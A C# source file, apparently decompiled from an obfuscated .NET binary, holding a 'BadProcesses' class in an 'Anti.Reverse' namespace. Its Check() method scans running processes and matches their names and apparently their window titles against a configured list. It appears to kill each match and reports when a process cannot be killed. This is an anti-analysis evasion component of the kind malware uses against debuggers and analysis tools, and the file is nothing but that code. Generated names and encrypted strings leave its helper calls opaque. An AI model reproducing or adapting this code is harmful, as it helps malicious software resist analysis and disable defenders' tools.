using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;

namespace Application.Anti.Reverse.Methods
{
	// Token: 0x02000047 RID: 71
	internal class BadProcesses
	{
		// Token: 0x06000225 RID: 549 RVA: 0x0000E124 File Offset: 0x0000C324
		[MethodImpl(MethodImplOptions.NoInlining)]
		public static bool Check()
		{
			foreach (Process process in delegate012d.f000162())
			{
				if (process != BadProcesses.CurrentProcess)
				{
					foreach (string value in Settings.BadProcesses)
					{
						if (delegate0cd.f0000a9(process).ToLower().Replace(c0000c0.m00000f("±"), c0000c0.m00000f("")).Contains(value) || delegate0cd.f0000aa(process).ToLower().Replace(c0000c0.m00000f("±"), c0000c0.m00000f("")).Contains(value))
						{
							delegate012e.f000163(process);
							if (!delegate012e.f000164(process))
							{
								return true;
							}
						}
					}
				}
			}
			return false;
		}

		// Token: 0x06000226 RID: 550 RVA: 0x0000E220 File Offset: 0x0000C420
		[MethodImpl(MethodImplOptions.NoInlining)]
		public BadProcesses()
		{
		}

		// Token: 0x06000227 RID: 551 RVA: 0x0000E228 File Offset: 0x0000C428
		// Note: this type is marked as 'beforefieldinit'.
		static BadProcesses()
		{
			c0000c0.Initialize();
			c0000c0.PostInitialize();
			BadProcesses.CurrentProcess = delegate012f.f000169();
		}

		// Token: 0x040000A2 RID: 162
		private static Process CurrentProcess;
	}
}
